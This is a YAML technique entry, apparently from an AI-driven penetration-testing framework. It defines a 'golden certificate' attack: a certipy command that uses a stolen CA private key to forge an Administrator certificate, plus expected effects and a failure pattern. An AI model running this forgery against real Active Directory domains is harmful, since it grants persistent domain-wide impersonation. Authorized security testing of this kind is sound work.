name: certipy_forge
category: ad
description: Golden certificate forgery with stolen CA cert
preconditions:
- domain_joined
parameters:
  target_ip: from_engagement.target_ip
command_template: certipy forge -ca-pfx '{ca_pfx}' -upn 'administrator@{domain}' -subject 'CN=Administrator'
parser: generic_parser
expected_effects:
- adcs_findings
- certificate_obtained
falsifier:
  pattern: error|failed|refused|denied
  timeout: 30
model_tier: haiku
mechanism: "Forges certificate using stolen CA private key. Equivalent to golden ticket \u2014 any user, indefinite validity."
hacktricks_ref: windows-hardening/active-directory-methodology/ad-certificates/domain-persistence.md
references:
  ocd_mindmap_node_ids:
  - 1eab3dd158
  - 4a78adc22a
  - 682b8c0d85
  - 6ef6b75aa3
  - 92b68f891a
  - e59ff07eb1
